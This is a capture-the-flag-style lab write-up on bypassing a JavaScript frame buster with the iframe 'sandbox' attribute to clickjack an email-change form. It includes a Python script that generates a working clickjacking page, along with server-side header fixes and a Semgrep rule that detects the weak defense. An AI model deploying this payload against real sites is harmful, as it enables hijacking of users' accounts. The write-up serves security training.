---
title: "Lab 3: Clickjacking with a frame buster script"
date: 2026-04-07
categories: [portswigger, Clickjacking] 
tags: [clickjacking]
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-23-lab2_api_testing/
---

## 1. Executive Summary

**Vulnerability:** Clickjacking (Frame Buster Bypass).

**Description:** The application attempts to protect itself from being framed by using a legacy client-side JavaScript "frame buster" script. However, modern HTML5 introduces the `sandbox` attribute for `<iframe>` elements. By framing the target site using a restricted sandbox that omits the `allow-top-navigation` permission, an attacker can neutralize the JavaScript defense. The browser explicitly blocks the target site's script from redirecting the parent window, leaving the site trapped in the invisible iframe and vulnerable to UI redressing.

**Impact:** Unauthorized Account Modification. The attacker successfully frames the site, stages a pre-populated email change, and tricks the victim into clicking the submit button.

## 2. The Attack

**Objective:** Neutralize the target's JavaScript frame buster using the HTML5 `sandbox` attribute, and trick the victim into updating their email address.

1. **Reconnaissance:**
    - I logged in as `wiener` and inspected the `/my-account` page.
    - I noticed that if I tried to frame the page normally, it would immediately "break out" of the frame and redirect my top-level browser window to the account page.
    - Looking at the source code, I found a JavaScript frame buster: `if (top != self) { top.location = self.location; }`.
    - The server was missing the `X-Frame-Options` and `Content-Security-Policy` HTTP headers.
2. **Payload Construction (The Bypass):**
    - I went to the Exploit Server and drafted the malicious HTML.
    - I embedded the target URL (pre-populated with my malicious email) inside an `<iframe>`.
    - **The Critical Bypass:** I added the attribute `sandbox="allow-forms"` to the iframe.
3. **Exploitation:**
    - By specifying *only* `allow-forms`, I instructed the victim's browser to heavily restrict what the framed page could do. Crucially, I did *not* include the `allow-top-navigation` or `allow-scripts` permissions.
    - When the target page loaded, its frame buster script attempted to execute `top.location = self.location`. The browser intercepted this and blocked it with a security exception, neutralizing the defense.
    - I aligned the invisible iframe's "Update email" button over my decoy "Click me" button.
    - The victim clicked the decoy, the allowed form submission triggered, and the email was changed to `hacked@kh4n.com`.

## 3. Code Review

*This section analyzes the flawed defense mechanism.*

**Vulnerability Analysis (Explanation):**

Before `X-Frame-Options` became a standard HTTP header, developers relied on "frame busting" JavaScript. The script checks if the current window (`self`) is the topmost window (`top`). If it isn't, it forcefully changes the top window's URL to its own.

### Vulnerable Front-End (JavaScript)

```html
<head>
    <script>
        if (window.top !== window.self) {
            window.top.location = window.self.location;
        }
    </script>
</head>
```

**Technical Flow & Syntax Explanation:**

- **`window.top !== window.self`**: Evaluates to `true` if the page is running inside an `<iframe>`.
- **`window.top.location = ...`**: Attempts to navigate the parent window away from the attacker's site.
- **The Flaw**: Client-side JavaScript executes under the rules of the browser. When an attacker uses `<iframe sandbox="allow-forms">`, they place the page in a heavily restricted environment. The browser throws a `SecurityError` when the script tries to access `window.top.location`, silently killing the script and leaving the iframe exactly where the attacker wants it.

### Mock PR Comment

The application currently relies on a client-side JavaScript frame buster to prevent Clickjacking. This is a deprecated and bypassable technique. Attackers can use the HTML5 `sandbox` attribute on their iframes to neutralize our JavaScript, allowing them to frame the site and conduct UI redressing attacks.

**Recommendation:** Remove the JavaScript frame buster. Implement robust, server-side anti-framing protections by returning `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'none'` HTTP headers on all sensitive responses.

## 4. The Fix

**Explanation of the Fix:**

Security controls must be enforced by the browser based on strict HTTP headers provided by the server, not by executable code running within the document itself.

### Secure Java (Spring Security)

```java
@Configuration
@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .headers()
                // SECURE: Server-side HTTP headers cannot be bypassed by sandbox attributes
                .frameOptions().sameOrigin()
                .contentSecurityPolicy("frame-ancestors 'self'");
    }
}
```

### Secure C# (ASP.NET Core)

```csharp
public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    // SECURE: Inject framing protection headers globally in the middleware pipeline
    app.Use(async (context, next) =>
    {
        context.Response.Headers.Add("X-Frame-Options", "SAMEORIGIN");
        context.Response.Headers.Add("Content-Security-Policy", "frame-ancestors 'self'");
        await next();
    });

    app.UseRouting();
    // ...
}
```

**Technical Flow & Syntax Explanation:**

When a browser receives `X-Frame-Options` or `CSP: frame-ancestors`, the browser's rendering engine *refuses to draw the frame entirely*. It doesn't matter if the attacker uses the `sandbox` attribute; the network layer dictates that the content cannot be displayed in a third-party context, stopping Clickjacking cold.

## 5. Automation

*A Python script to generate the HTML payload for the Exploit Server, specifically highlighting the `sandbox` bypass.*
{% raw %}
```python
#!/usr/bin/env python3
import argparse

def generate_sandboxed_payload(lab_id, target_path, attacker_email, top, left):
    target_url = f"https://{lab_id}.web-security-academy.net{target_path}?email={attacker_email}"
    
    html_payload = f"""
<!DOCTYPE html>
<html>
<head>
    <style>
        #target_website {{
            position: relative;
            width: 700px;
            height: 700px;
            opacity: 0.0001;
            z-index: 2;
        }}
        #decoy_website {{
            position: absolute;
            width: 300px;
            height: 400px;
            top: {top}px;
            left: {left}px;
            z-index: 1;
        }}
        .decoy-btn {{
            padding: 10px 20px;
            background-color: #ff4757;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div id="decoy_website">
        <h2>Click to verify your account!</h2>
        <button class="decoy-btn">Click me</button>
    </div>
    
    <iframe id="target_website" sandbox="allow-forms" src="{target_url}"></iframe>
</body>
</html>
"""
    return html_payload

def main():
    parser = argparse.ArgumentParser(description="Generate Sandboxed Clickjacking Payload")
    parser.add_argument("lab_id", help="The unique PortSwigger Lab ID")
    parser.add_argument("--email", default="hacked@kh4n.com", help="The email to pre-fill")
    parser.add_argument("--top", default="460", help="CSS Top value for decoy")
    parser.add_argument("--left", default="60", help="CSS Left value for decoy")
    
    args = parser.parse_args()
    
    payload = generate_sandboxed_payload(args.lab_id, "/my-account", args.email, args.top, args.left)
    
    print("[*] Copy the following HTML into your Exploit Server:")
    print("-" * 50)
    print(payload)
    print("-" * 50)

if __name__ == "__main__":
    main()
```
{% endraw %}

## 6. Static Analysis (Semgrep)

Because this vulnerability relies on the presence of a weak front-end defense mechanism, we can write a Semgrep rule to scan frontend assets for legacy frame busting scripts.

### JavaScript Rule (Frontend Detection)

```yaml
rules:
  - id: javascript-legacy-frame-buster
    languages: [javascript, typescript, html]
    message: |
      Legacy JavaScript frame busting detected. 
      Client-side frame busters can be easily bypassed using the HTML5 <iframe> 'sandbox' attribute.
      Remove this script and rely exclusively on 'X-Frame-Options' or 'Content-Security-Policy' HTTP headers.
    severity: WARNING
    patterns:
      - pattern-either:
          - pattern: |
              if (window.top !== window.self) { ... }
          - pattern: |
              if (top != self) { ... }
          - pattern: |
              if (top.location != self.location) { ... }
```

**Technical Flow & Syntax Explanation:**

- **`languages: [javascript, typescript, html]`**: This rule parses both dedicated JS files and inline `<script>` tags within HTML documents.
- **`pattern-either`**: Provides multiple common variations of how developers typically wrote legacy frame busters in the early 2010s. When Semgrep matches these equality checks against the `top` and `self` window objects, it flags the code as a deprecated and bypassable security control.